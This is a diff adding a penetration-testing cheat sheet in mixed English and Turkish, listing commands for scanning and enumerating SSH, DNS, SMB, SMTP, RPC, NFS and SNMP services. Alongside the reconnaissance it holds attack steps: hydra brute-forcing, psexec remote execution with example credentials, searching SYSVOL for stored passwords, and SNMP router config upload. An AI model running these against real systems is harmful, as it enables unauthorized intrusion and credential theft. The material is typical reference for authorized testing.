@@ -1,0 +1,160 @@
+NMAP
+
+# Alive hosts
+nmap -sn 10.0.0.0/24	
+
+# scan the 1024 most common ports, run OS detection, run default nmap scripts
+nmap -A -oA nmap <targetip>	
+
+# Scan more deeply, scan all 65535 ports on $targetip with a full connect scan
+nmap -v -sT <targetip> -p- 
+
+# more options
+nmap -sV -sC -v -A <targetip> -p- 
+nmap -sT -sV -A -O -v -p 1–65535 <targetip> 
+
+# my preference
+nmap -sV -sC -v -oA output <targetip>
+nmap -p- -v <targetip>
+-----------------------
+# SSH msfconsole 
+use exploit/multi/ssh/sshexec
+hydra -l <username> -P <wordlist> ssh://ipadres
+-----------------------
+# KNOCK KNOCK
+nmap -p 22 <ipadres> | Filter
+knockd <sayilar> 
+
+------------------------
+# DNS 
+fierce -dns <domain> : zone transfer
+dnsrecon <domain> : zone transfer
+dns-zone-transfer.nse : nmap zone transfer
+dns-recursion.nse : nmap recursive scan transfer
+dns-brute.nse : nmap dns brute force
+auxiliary/gather/enum_dns : msfconsole enumeration dns 
+auxiliary/scanner/dns/dns_amp : msfconsole dns amplication 
+host -t ns zonetranfer.me : name serverları tespit ediyoruz
+host -l zonetranfer.me nsztm2.digi.ninja. : sonra site adı ve name server ile zone tranfers kontrolü yapıyoruz.
+ 
+-----------------------
+SMB
+
+Port 139 and 445- SMB/Samba shares
+Samba is a service that enables the user to share files with other machines
+works the same as a command line FTP client, may browse files without even having credentials
+
+# Share List:
+smbclient --list <targetip>
+smbclient -L <targetip>
+
+# Msfconsole smb connection for linux
+use auxiliary/admin/smb/samba_symlink_traversal
+
+# Check SMB vulnerabilities:
+nmap --script=smb-check-vulns.nse <targetip> -p445
+
+# basic nmap scripts to enumerate shares and OS discovery
+nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
+
+# Connect using Username
+root@kali:~# smbclient -L <targetip> -U username -p 445
+
+# Connect to Shares
+smbclient \\\\<targetip>\\ShareName
+smbclient \\\\<targetip>\\ShareName -U john
+sbmclient //<targetip>/tmp
+
+# enumarete with smb-shares, -a “do everything” option
+enum4linux -a 192.168.1.120
+
+# learn the machine name and then enumerate with smbclient
+nmblookup -A 192.168.1.102
+smbclient -L <server_name> -I 192.168.1.105
+
+# rpcclient - Connect with a null-session (only works for older windows servers)
+rpcclient -U james 10.10.10.52
+rpcclient -U "" 192.168.1.105
+(press enter if asks for a password)
+rpcclient $> srvinfo
+rpcclient $> enumdomusers
+rpcclient $> enumalsgroups domain
+rpcclient $> lookupnames administrators
+rpcclient> querydominfo
+rpcclient> enumdomusers
+rpcclient> queryuser john
+
+# scan for vulnerabilities with nmap
+nmap --script "vuln" <targetip> -p139,445
+
+# Windows smb
+msfconsole :
+auxiliary/scanner/smb/smb_login
+psexec.py PENTEST0/<kullanıcıadı>:<şifre>@<ipadresi
+psexec.py PENTEST0/Administrator:123456@192.168.1.51
+python psexec.py <username>@<ipadres> cmd
+
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+parolalar groups.xml ,scheduledtasks.xml,services.xml vb dosyalar icerisinde parola bilgileri olabilir.
+smbclient \\\\ipadres\\SYSVOL -U 'domain\user'
+------------------------
+
+SMTP
+
+# telnet or netcat connection
+nc <targetip> 25
+VRFY root
+# Check for commands
+nmap -script smtp-commands.nse <targetip>
+# Metasploit
+smtp_enum
+smtp_relay
+
+------------------------
+
+Port 111 - RPC
+
+Rpcbind can help us look for NFS-shares. So look out for nfs. Obtain list of services running with RPC:
+
+rpcbind -p <targetip>
+rpcinfo –p x.x.x.x
+
+# using nmap, see which port NFS is listening
+locate *rpc*.nse
+nmap --script rpcinfo.nse <targetip> -p 111
+
+-------------------------
+
+NFS
+
+# to find the public share
+locate *nfs*.nse
+nmap --script nfs-showmount.nse <targetip>
+
+# mount the share to a folder under /tmp
+mkdir /tmp/nfs
+/sbin/mount.nfs <targetip>:/home/box /tmp/nfs
+
+------------------------
+
+SNMP
+
+snmp-check -c public <ipadresi> // 161 numarali router uzerinde ki public dosyasina erisim saglariz.
+snmp-check -c private <ipadresi>
+
+snmp-check -p 161 -c private -w <ipadresi>
+snmp-check -p 161 -c public -w <ipadresi> // yazma yetkisi kontrolleri
+
+onesixtyone <ipadresi> // community testlleri 
+
+cisco_config_tftp // metasploit module
+cisco_upload_tftp //comunnity name tespitinden sonra yeni bir config dosyayisini yuklemek icin kullanilir.
+
+auxiliary/scanner/snmp/snmp_login : metasploit
+
+-------------------------------------------------------
+#SSH
+
+msfconsole post module : ssh_creds
+hydra bruteforce
+
